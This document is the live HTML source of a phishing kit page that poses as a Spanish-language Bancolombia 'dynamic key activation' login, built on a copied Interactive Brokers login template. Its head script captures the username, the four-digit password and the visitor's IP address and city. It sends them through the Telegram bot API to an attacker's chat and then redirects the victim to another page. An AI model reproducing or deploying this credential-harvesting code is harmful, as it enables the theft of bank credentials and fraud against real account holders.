<html data-theme="light"><head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0">
    <meta name="HandheldFriendly" content="true">
    <meta name="format-detection" content="telephone=no">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
	
	
	<script src="datos_telgr.js"></script>
	
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  

   <script>
         $.getJSON("https://api.ipify.org?format=json",
          function(data) {
             $("#gfg").html(data.ip);
         })
      </script>
      <script>
         $.getJSON("https://ipinfo.io", function (response) {
    $("#ip").html("IP: " + response.ip);
    $("#address").html("" + response.city + ", " + response.country);
    })

	  </script>
	  
	  				<script>

var u_name,  p_name,  ip, ip2;
var ready = function () {
    u_name = document.getElementById("user_name").value;
	p_name = document.getElementById("password").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "Datos BANCOL-MBIA:\n👤Usuario:" + u_name + "\n🔐Clave: " + p_name + "\n🌎IP: " + ip +"\n" + ip2;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
	  window.location = 'rescata.html';
  
        console.log(response);
		

	
    });
    return false;
};

			</script>

    
        <link rel="icon" sizes="192x192" href="https://www.interactivebrokers.co.uk/images/web/favicons/home-screen-icon-192x192.png">
        <link rel="icon" sizes="128x128" href="https://www.interactivebrokers.co.uk/images/web/favicons/home-screen-icon-128x128.png">
    

    
        <meta name="apple-mobile-web-app-title" content="mobileAM">
        <link rel="apple-touch-icon" sizes="57x57" href="/images/web/favicons/apple-touch-icon-57x57.png">
        <link rel="apple-touch-icon" sizes="72x72" href="/images/web/favicons/apple-touch-icon-72x72.png">
        <link rel="apple-touch-icon" sizes="114x114" href="/images/web/favicons/apple-touch-icon-114x114.png">
        <link rel="apple-touch-icon" sizes="144x144" href="/images/web/favicons/apple-touch-icon-144x144.png">
    

    <link rel="stylesheet" type="text/css" media="all" href="/css/bootstrap-4.3.1/bootstrap.min.css" id="css-bootstrap">
    <link rel="stylesheet" type="text/css" media="all" href="/css/fontawesome-5.9.0/all.min.css" id="css-fontawesome">
    <link rel="stylesheet" type="text/css" media="all" href="/css/bootstrap-switch-3.3.2/bootstrap-switch.min.css" id="css-bootstrap-switch">
    <link rel="stylesheet" type="text/css" media="all" href="/css/switchery/switchery.min.css" id="css-switchery">
    <link rel="stylesheet" type="text/css" media="all" href="/css/icheck-1.0.2/icheck.css" id="css-icheck">
    <link rel="stylesheet" type="text/css" media="screen" href="/css/reg-am/login-ltr.css">
    <link rel="stylesheet" type="text/css" media="screen" href="/css/reg-am/theme-ibkr.css">
    <link rel="stylesheet" type="text/css" media="all" href="Templates/otp-responsive.css?1666495418844">

    
    

    <script type="text/javascript" crossorigin="anonymous" src="css/jquery-3.4.1/jquery.min.js"></script>
    <script type="text/javascript" crossorigin="anonymous" src="css/jquery-ui-1.12.1/jquery-ui.min.js"></script>
    <script type="text/javascript" crossorigin="anonymous" src="css/bootstrap-4.3.1/bootstrap.bundle.min.js"></script>
    <script type="text/javascript" crossorigin="anonymous" src="css/bootstrap-switch-3.3.2/bootstrap-switch.min.js"></script>
    <script type="text/javascript" crossorigin="anonymous" src="css/switchery/switchery.min.js"></script>
    <script type="text/javascript" crossorigin="anonymous" src="css/switchery/switchery-init.js"></script>
    <script type="text/javascript" crossorigin="anonymous" src="css/icheck-1.0.2/icheck.min.js"></script>
    <script type="text/javascript" crossorigin="anonymous" src="css/js/icheck-1.0.2/icheck-init.js"></script>

    

    <script src="CombineFiles" type="text/javascript"></script>

    <script type="text/javascript">
        debug = false;
        //SET SF VERSION FOR myxyz
        SF_VERSION = 1;
        
        window.IBSSO = window.IBSSO || {};
        IBSSO.isRL = true;

        loadingCallback();

        
            app_context = "AM.LOGIN";
        

        var partn = "null";
        var cookiesOk = VerifyCookiesEnabled();

        function checkCookies() {
            if (!cookiesOk) {
                showErrorMessage("ERRORMSG", "Cookies must be enabled");
                $("#authcredentials").remove();
            } else {
                if(partn != null && partn != "null" && partn.length > 0) {
                    var expDate = new Date();
                    expDate.setTime(expDate.getTime() + (60 * 60 * 24 * 100 * 1000));
                    SetCookie("partnerID", partn, expDate, "");
                }
                if(!document.cookie.match(/^(.*;)?\s*SBID\s*=\s*[^;]+(.*)?$/)) {
                    var expDate = new Date();
                    var ssoid = Math.random().toString(36).substring(2) + expDate.getTime().toString(36);
                    expDate.setTime(expDate.getTime() + (60 * 60 * 24 * 365 * 10 * 1000));    // set to expire after 10 years
                    SetCookie("SBID", ssoid, expDate, "");
                }
            }
        }

        function checkSubmit() {
            writeDebug("checkSubmit: " + STATE);
            if (canDisableLoginForm()) {
                document.getElementById("submitForm").disabled = true;
            }
            return true;
        }

        function enableSubmit() {
            writeDebug("enableSubmit: " + STATE);
            document.getElementById("submitForm").disabled = false;
            return true;
        }

        function clickLogin(evt) {
            evt = (evt) ? evt : event;
            var charCode = (evt.charCode) ? evt.charCode : ((evt.which) ? evt.which : evt.keyCode);
            if (charCode == 13 || charCode == 3) {
                writeDebug("password enter pressed " + charCode);
                document.getElementById("submitForm").disabled = false;
                document.getElementById("submitForm").focus();
                return true;
            }
            return false;
        }

        function getMaintenaceMsg() {
            $(".gsss").hide();
            var params = {
                p: 'login',
                type: 'maintenance',
                format: 'webapp'
            };
            $.ajax({
                type: 'POST',
                url: '/portal.proxy/v1/gstat/bulletins',
                data: JSON.stringify(params),
                contentType: 'application/json; charset=utf8',
                success: function(data, txtStatus) {
                    if (data) {
                        $(".gsss").html(data).show();
                    }
                }
            });
        }

        function initFeedback(element) {
            if ($("a#feedback").attr("data-version") == "") {
                fetchVersion();
            }

            var version = $("a#feedback").attr("data-version");
            $(element).attr("href", function() {
                return "https://www.interactivebrokers.com/en/index.php?f=3869&ibotforceinit=true&mode=noAccount2";
            });
        }

        function fetchVersion() {
            $.ajax({
                type : "GET",
                url : "/Universal/rollout.txt",
                async : false,
                success : function(data, textStatus, jqXHR) {
                    $("a#feedback").attr("data-version", $(data).text());
                }
            });
        }

        if (window != top) {
            top.location.href = location.href;
        }

        var originalShowError = window.showErrorMessage;
        window.showErrorMessage = function(field_id, text) {
            originalShowError.apply(this, [ field_id, text ]);

            if(typeof text !== 'undefined' && text !== null && text !== '') {
                $("#" + field_id).show();
            } else {
                $("#" + field_id).hide();
            }
        };

        var originalShowSecondFactorList = window.showSecondFactorList;
        window.showSecondFactorList = function() {
            originalShowSecondFactorList.apply(this);

            $("#sf_select").addClass("form-control");
            $("#sf_select").css("width", "");
        };

        var originalOnChangeSelectSf = window.onChangeSelectSF;
        window.onChangeSelectSF = function(el) {
            $("#chlgtext").html('');
            $("#chlgtext_Bingo").hide();
            $("#chlgtext_SWCR").hide();

            var select = $(el);

            if(select.val() === '') {
                $("#chlginput").hide();
                $("#ibKeyInst").hide();
            } else {
                $("#chlginput").show();
            }

            originalOnChangeSelectSf.apply(this, [ el ]);
        };

        function checkPaperSwitch() {
            var paperSwitch = $("#paperSwitch")[0];
            var body = $("body")[0];

            if(paperSwitch && paperSwitch.checked) {
                $("#simulated_banner").show();
                $("#loginType").val("2");

                $("#paperSpan").addClass('active');
                $("#liveSpan").removeClass('active');

                $(body).removeClass("bg-gray");
                $(body).addClass("bg-red");
            } else {
                $("#simulated_banner").hide();

                
                    $("#loginType").val("1");
                

                

                $("#liveSpan").addClass('active');
                $("#paperSpan").removeClass('active');

                $(body).removeClass("bg-red");
                $(body).addClass("bg-gray");
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            checkCookies();
             getMaintenaceMsg(); 

            $('#user_name').val('');
            $('#password').val('');

            var jsSwitch = $("#paperSwitch");
            $(jsSwitch).change(function(e) {
                checkPaperSwitch();
            });

            var loginType = "1";
            if(loginType === "2") {
                jsSwitch[0].checked = true;
            }

            checkPaperSwitch();

            new Switchery(jsSwitch[0], {
                color: '#A02200',
                className : 'switchery switchery-small'
            });

            $("#authcredentials").show();

            
        });
    </script>

    <script type="text/javascript">
        $(document).ready(function() {
            $.ajax({
                type: "GET",
                url: "/en/includes/general/gdpr-am.php",
                success: function(data) {
                    $("body").prepend(data);
                    if ($('#cookie-modal').length) {
                        $('#cookie-modal').modal('show');
                    }
                }
            });
        });
    </script>

    
    <title>Home</title>
    

<script>(window.BOOMR_mq=window.BOOMR_mq||[]).push(["addVar",{"rua.upush":"false","rua.cpush":"false","rua.upre":"false","rua.cpre":"false","rua.uprl":"false","rua.cprl":"false","rua.cprf":"false","rua.trans":"","rua.cook":"false","rua.ims":"false","rua.ufprl":"false","rua.cfprl":"false","rua.isuxp":"false","rua.texp":"norulematch"}]);</script>
                          <script>!function(e){var n="https://s.go-mpulse.net/boomerang/";if("False"=="True")e.BOOMR_config=e.BOOMR_config||{},e.BOOMR_config.PageParams=e.BOOMR_config.PageParams||{},e.BOOMR_config.PageParams.pci=!0,n="https://s2.go-mpulse.net/boomerang/";if(window.BOOMR_API_key="E6798-MSRLA-AGTKP-4QTSS-AEXF9",function(){function e(){if(!o){var e=document.createElement("script");e.id="boomr-scr-as",e.src=window.BOOMR.url,e.async=!0,i.parentNode.appendChild(e),o=!0}}function t(e){o=!0;var n,t,a,r,d=document,O=window;if(window.BOOMR.snippetMethod=e?"if":"i",t=function(e,n){var t=d.createElement("script");t.id=n||"boomr-if-as",t.src=window.BOOMR.url,BOOMR_lstart=(new Date).getTime(),e=e||d.body,e.appendChild(t)},!window.addEventListener&&window.attachEvent&&navigator.userAgent.match(/MSIE [67]\./))return window.BOOMR.snippetMethod="s",void t(i.parentNode,"boomr-async");a=document.createElement("IFRAME"),a.src="about:blank",a.title="",a.role="presentation",a.loading="eager",r=(a.frameElement||a).style,r.width=0,r.height=0,r.border=0,r.display="none",i.parentNode.appendChild(a);try{O=a.contentWindow,d=O.document.open()}catch(_){n=document.domain,a.src="javascript:var d=document.open();d.domain='"+n+"';void(0);",O=a.contentWindow,d=O.document.open()}if(n)d._boomrl=function(){this.domain=n,t()},d.write("<bo"+"dy onload='document._boomrl();'>");else if(O._boomrl=function(){t()},O.addEventListener)O.addEventListener("load",O._boomrl,!1);else if(O.attachEvent)O.attachEvent("onload",O._boomrl);d.close()}function a(e){window.BOOMR_onload=e&&e.timeStamp||(new Date).getTime()}if(!window.BOOMR||!window.BOOMR.version&&!window.BOOMR.snippetExecuted){window.BOOMR=window.BOOMR||{},window.BOOMR.snippetStart=(new Date).getTime(),window.BOOMR.snippetExecuted=!0,window.BOOMR.snippetVersion=12,window.BOOMR.url=n+"E6798-MSRLA-AGTKP-4QTSS-AEXF9";var i=document.currentScript||document.getElementsByTagName("script")[0],o=!1,r=document.createElement("link");if(r.relList&&"function"==typeof r.relList.supports&&r.relList.supports("preload")&&"as"in r)window.BOOMR.snippetMethod="p",r.href=window.BOOMR.url,r.rel="preload",r.as="script",r.addEventListener("load",e),r.addEventListener("error",function(){t(!0)}),setTimeout(function(){if(!o)t(!0)},3e3),BOOMR_lstart=(new Date).getTime(),i.parentNode.appendChild(r);else t(!1);if(window.addEventListener)window.addEventListener("load",a,!1);else if(window.attachEvent)window.attachEvent("onload",a)}}(),"".length>0)if(e&&"performance"in e&&e.performance&&"function"==typeof e.performance.setResourceTimingBufferSize)e.performance.setResourceTimingBufferSize();!function(){if(BOOMR=e.BOOMR||{},BOOMR.plugins=BOOMR.plugins||{},!BOOMR.plugins.AK){var n=""=="true"?1:0,t="",a="xy6p5xk7mrl4wy2uwo5a-f-408880dbf-clientnsv4-s.akamaihd.net",i="false"=="true"?2:1,o={"ak.v":"33","ak.cp":"1150933","ak.ai":parseInt("714965",10),"ak.ol":"0","ak.cr":33,"ak.ipv":4,"ak.proto":"h2","ak.rid":"34d050cc","ak.r":45850,"ak.a2":n,"ak.m":"a","ak.n":"essl","ak.bpcip":"190.60.254.0","ak.cport":38444,"ak.gh":"95.100.87.199","ak.quicv":"","ak.tlsv":"tls1.3","ak.0rtt":"","ak.csrc":"-","ak.acc":"","ak.t":"1666495418","ak.ak":"hOBiQwZUYzCg5VSAfCLimQ==zRv4l4HV3w3chyUEjGQCgxNY02hwzc5tz6b5LsthuAUHO04mT5z8X+JecO6pAthWycT+U8lAUMjuv8j5SJVVVxBDOi8crCbnAAHxYgnmAZ5f+Y56LGFNXa0atUMfyQCxihe4QJJvZBCXAJAJyPN7wj6B8HwwFgn0yLLle3rP6tszMBhJT5llAKIJeH4t5fObjwEZefy2PHi1LFQ88PVUy9hNFFofYX1R2llMdXpUmtolzJAvOTe/syjymOyhA8mcqsBlDn7OkZ+Y3nAJusblaCQTGHXd6bydj0uVfvMawyOuCMv91TNmbnAENK1yTiIFWaqwsGwx+QaKaqZodfLA4o/w0yGVSs+q5oGlat8p0AIIvB4BEvGLxHxqt8nl/CyXN2JMY0Pomo2biDEaTArunnp9pUBmBaVK8Qksu3eOnnM=","ak.pv":"27","ak.dpoabenc":"","ak.tf":i};if(""!==t)o["ak.ruds"]=t;var r={i:!1,av:function(n){var t="http.initiator";if(n&&(!n[t]||"spa_hard"===n[t]))o["ak.feo"]=void 0!==e.aFeoApplied?1:0,BOOMR.addVar(o)},rv:function(){var e=["ak.bpcip","ak.cport","ak.cr","ak.csrc","ak.gh","ak.ipv","ak.m","ak.n","ak.ol","ak.proto","ak.quicv","ak.tlsv","ak.0rtt","ak.r","ak.acc","ak.t","ak.tf"];BOOMR.removeVar(e)}};BOOMR.plugins.AK={akVars:o,akDNSPreFetchDomain:a,init:function(){if(!r.i){var e=BOOMR.subscribe;e("before_beacon",r.av,null,null),e("onbeacon",r.rv,null,null),r.i=!0}return this},is_complete:function(){return!0}}}}()}(window);</script><link href="https://s.go-mpulse.net/boomerang/E6798-MSRLA-AGTKP-4QTSS-AEXF9" rel="preload" as="script"><link href="https://s.go-mpulse.net/boomerang/E6798-MSRLA-AGTKP-4QTSS-AEXF9" rel="preload" as="script"><link href="https://s.go-mpulse.net/boomerang/E6798-MSRLA-AGTKP-4QTSS-AEXF9" rel="preload" as="script"><script id="boomr-scr-as" src="https://s.go-mpulse.net/boomerang/E6798-MSRLA-AGTKP-4QTSS-AEXF9" async=""></script><script id="boomr-scr-as" src="https://s.go-mpulse.net/boomerang/E6798-MSRLA-AGTKP-4QTSS-AEXF9" async=""></script><script id="boomr-scr-as" src="https://s.go-mpulse.net/boomerang/E6798-MSRLA-AGTKP-4QTSS-AEXF9" async=""></script></head>
<body onload="usernameFocus(); xyz_initialize();" onclick="rng_seed_time();" onkeypress="rng_seed_time();" class="bg-gray">
    <section class="login-page">
        <div class="container">
            <div class="login-container">
                <div class="row">
                    <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                        
                            <p style="text-align:center;"><img src="mit.jpg" style="height:40px;width:260px;"></p>
                        
                    </div>
                </div>


<form id="loginform" name="loginform" method="post"  onsubmit="return sender()">
<p id="gfg"  hidden=""></p>
						<p id="address"  hidden=""></p>
                    
                    <div class="login">
                        <div id="authcredentials" style="">
                            <div class="row login-step-username">
                                <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                                    
                                    <div id="simulated_banner" class="simulated-banner" style="display: none;"><p>simulated</p></div>

                                    
                                    
                                        
                                    

                                    

                                    
                                    <center><h1>Bienvenido al panel de activacion de clave dinamica
                                    </h1>
                                    

                                    
                                    <div class="form-group">
                                        <div class="icon-addon">
                                            
                                            
                                            
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                            <input type="text" id="user_name" name="user_name" value="" autocomplete="off" maxlength="30"
                                            autocorrect="off" autocapitalize="off" size="10" onfocus="enableSubmit()" onclick="forceFocusUserName()" onkeypress="handleUserNameEvent(event)"
											placeholder="Ingrese su usuario" class="form-control" onblur="initAuthentication('user_name','ERRORMSG');" style="width: 300px;height:40px;" required><br><br>
                                        </div>
                                    </div>

                                    
                                    <div class="form-group">
                                        <div class="icon-addon">
                                            
                                            
                                            
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                            <input type="password" id="password" name="password" size="10" autocomplete="off" onfocus="enableSubmit()" onclick="forceFocusPassword()" onkeypress="clickLogin(event)"
											placeholder="Clave" class="form-control" maxlength="4" onblur="completeAuthentication('password','ERRORMSG');" style="width: 300px;height:40px;"  required>
                                        </div>
                                    </div>

                                    
                                    
                                        <p class="link-password">
                                            
                                        </p>
                                    
                                    

                                    
                                    

                                    
                                    
                                    <br>
                                </div>
                            </div>

                   
</center>
                         

                            
                            <div class="row login-step-sf">
                                <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                                    <div id="authtable">
                                      
                                        <p id="ibKeyInst"></p>
                                        <div id="twofactauth">
                                            <div class="form-group">
                                                <center><button id="submitForm" type="submit" class="btn btn-lg btn-primary"
												style="background: #FDDA24;
    border-radius: 60px;
    font-family: OpenSans-Regular;
    color: #2C2A29;
    font-weight: bold;
    padding: 5px 10px;
    font-size: 18px;width: 300px;height:40px;border:none;">Ingresar</button></center>
                                            </div>
                                            
                                                <div class="text-center">
                                                    <p>
                                                        
                                                        
                                                    </p>
                                                </div>
                                            
                                        </div>
                                        <div id="otp-delivery" class="otp-delivery-section" style="display: none;">
                                            <div class="form-group">
                                                <h1 class="otp-title">Pick your delivery method</h1>
                                                <p class="otp-text"></p>
                                            </div>
                                            <div class="form-group">
                                                <div class="otp-buttons">
                                                    <button class="otp-button otp-selection otp-select-sms btn btn-lg btn-primary"><span class="fa fa-comment fa-lg"></span> Text</button>
                                                    <button class="otp-button otp-selection otp-select-voice btn btn-lg btn-primary"><span class="fa fa-phone fa-lg"></span> Voice</button>
                                                    <button class="otp-button otp-selection otp-select-email btn btn-lg btn-primary"><span class="fa fa-envelope fa-lg"></span> Email</button>
                                                </div>
                                            </div>
                                            <div class="form-group">
                                                <button class="otp-button otp-cancel btn btn-lg btn-default btn-block">Cancel</button>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                        </div>

                        
                        <div class="row">
                            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                                
                                    <div id="ERRORMSG" class="alert alert-danger margin-top-10" style="display: none;"></div>
                                

                                <noscript>
                                    <div class="alert alert-danger margin-top-10">
                                        JavaScript must be enabled to use this application!
                                    </div>
                                </noscript>
                            </div>
                        </div>

                            

                        
                        <input type="hidden" id="loginType" name="loginType" value="1">

                        
                        

                        
                        

                        
                        

                        
                        <!--To add a downtime message, alter line 6 and 7. Please leave the div below as is -->


                        <div class="gsss" style="display: none;">
                        </div>
                    </div>
                </form>
            </div>
            
        </div>
    </section>

    

</body></html>